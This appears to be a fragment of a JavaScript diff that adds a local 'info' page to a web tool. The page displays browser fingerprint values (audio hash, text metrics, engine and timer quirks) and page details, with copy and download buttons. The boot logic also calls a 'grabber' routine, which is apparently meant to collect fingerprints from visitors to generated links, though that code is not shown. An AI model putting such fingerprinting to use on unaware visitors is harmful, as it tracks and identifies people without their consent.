+        ["audio hash",   d.fingerprint.audio ? d.fingerprint.audio.hash : null],
+        ["audio sample", d.fingerprint.audio ? d.fingerprint.audio.sample : null]
+      ]),
+      section("fingerprint — text metrics", textRows),
+      section("fingerprint — math / Intl", mathRows),
+      section("fingerprint — engine quirks", [
+        ["stack first line", d.fingerprint.errorStack ? d.fingerprint.errorStack.firstLine : null],
+        ["stack line count", d.fingerprint.errorStack ? d.fingerprint.errorStack.lineCount : null],
+        ["time origin",      d.fingerprint.timer ? d.fingerprint.timer.timeOrigin : null],
+        ["timer resolution", d.fingerprint.timer ? d.fingerprint.timer.minDeltaMs + " ms" : null],
+        ["timer coarsened",  d.fingerprint.timer ? d.fingerprint.timer.reducedPrecision : null]
+      ]),
+      section("page", [
+        ["url",            d.page.url],
+        ["origin",         d.page.origin],
+        ["referrer",       d.page.referrer],
+        ["title",          d.page.title],
+        ["charset",        d.page.charset],
+        ["content type",   d.page.contentType],
+        ["history length", d.page.historyLength + " (count only — contents are not readable)"],
+        ["visibility",     d.page.visibility]
+      ])
+    ].join("");
+
+    I("json").textContent = JSON.stringify(d, null, 2);
+  }
+
+  let LAST = null;
+
+  async function runInfo(){
+    I("json").textContent = "scanning…";
+    I("iout").innerHTML = "";
+    try{
+      LAST = await scan();
+      render(LAST);
+    }catch(e){
+      I("json").textContent = "scan failed: " + (e && e.message ? e.message : e);
+    }
+  }
+
+  function initInfo(){
+    I("copy").addEventListener("click", async () => {
+      if(!LAST) return;
+      try{
+        await navigator.clipboard.writeText(JSON.stringify(LAST, null, 2));
+        I("copy").textContent = "copied";
+      }catch(e){
+        I("copy").textContent = "copy blocked";
+      }
+      setTimeout(() => { I("copy").textContent = "copy JSON"; }, 1400);
+    });
+
+    I("dl").addEventListener("click", () => {
+      if(!LAST) return;
+      const blob = new Blob([JSON.stringify(LAST, null, 2)], {type:"application/json"});
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "browser-info.json";
+      a.click();
+      setTimeout(() => URL.revokeObjectURL(a.href), 1000);
+    });
+
+    I("re").addEventListener("click", runInfo);
+
+    I("back").addEventListener("click", () => {
+      I("info").classList.remove("show");
+      location.hash = "";
+      location.reload();
+    });
+  }
+
   function boot(){
+    if(location.hash === "#info" || location.hash === "#/info"){
+      $("ui").classList.add("hidden");
+      I("info").classList.add("show");
+      initInfo();
+      runInfo();
+      return;
+    }
+
     const id = pickId();
     if(id) grabber(id);
     else   generator();
